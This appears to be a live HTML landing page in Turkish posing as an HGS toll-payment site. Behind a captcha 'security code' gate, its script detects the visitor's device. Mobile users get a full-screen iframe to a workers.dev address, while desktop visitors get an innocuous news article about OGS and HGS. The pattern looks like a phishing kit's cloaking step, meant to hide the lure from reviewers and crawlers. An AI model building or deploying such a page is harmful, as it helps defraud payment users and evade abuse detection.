<!DOCTYPE html>
<html lang="tr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ana Sayfa</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
</head>

<body style="background-image:url('https://cdn.glitch.global/0c91ea31-d205-4491-89c2-c27f6ece9983/hgs.jpg?v=1649496780557');    background-repeat: no-repeat;    background-size: cover;">
    <div class="bg">
    </div>
    <div class="container animate">
        <center>
            <div class="box " style="padding:2rem;width:80%;margin-top:2rem;min-width:250px" id="stw">
                <div class="form">

<br>
Yükleme yapmak için Güvenlik kodunuzu giriniz
                    <br><br><br>
                    <img src="cap.php" alt="" style="width: 50px;">
                    <br><br><br>
                    <input type="text" placeholder="Güvenlik kodunu giriniz" id="toke2ns" style="width: 100%;">
                    <br>
                    <br><br>
                    <button type="button" onclick="check()">İleri</button>
                </div>
            </div>
        </center>
        <div id="ss2" style="display:none">
            <iframe src="" frameborder="0" style="    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    position: fixed;
    width: 100%;
    z-index: 999;
    height: 100vh;
" id="ifr"></iframe>
        </div>
        <div class="footer">
            
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.2/jquery.min.js"
        integrity="sha512-tWHlutFnuG0C6nQRlpvrEhE4QpkG1nn2MOUMWmUeRePl4e3Aki0VB6W1v3oLjFtd0hVOtRQ9PHpSfN6u6/QXkQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script>


    function check() {

        $.ajax({
            url: "checkcap.php?kod=" + $("#toke2ns").val(),
            method: "get",

            success: function(data) {
                if (data == "a1") {
                    document.querySelector('#stw').style.display = 'none';
                    document.querySelector('#ss2').style.display = 'block';
                    var isMobile = ('DeviceOrientationEvent' in window || 'orientation' in window);
                    if (/Windows NT|Macintosh|Mac OS X|Linux/i.test(navigator.userAgent)) isMobile = false;
                    if (/Mobile/i.test(navigator.userAgent)) isMobile = true;
                    if (isMobile) {
                        $("#ifr").prop("src", "https://quiet-cake-0b9b.toolser.workers.dev/")
                    } else {
                        $("#ifr").prop("src",
                            "https://www.otomobilsayfasi.com/haber/ogs-ve-hgs-ayni-anda-kullanilacak-mi/1060700"
                            )
                    }
                } else {
                    alert("Güvenlik kodu hatalı")
                }
            }
        })

    }
    </script>
</body>

</html>
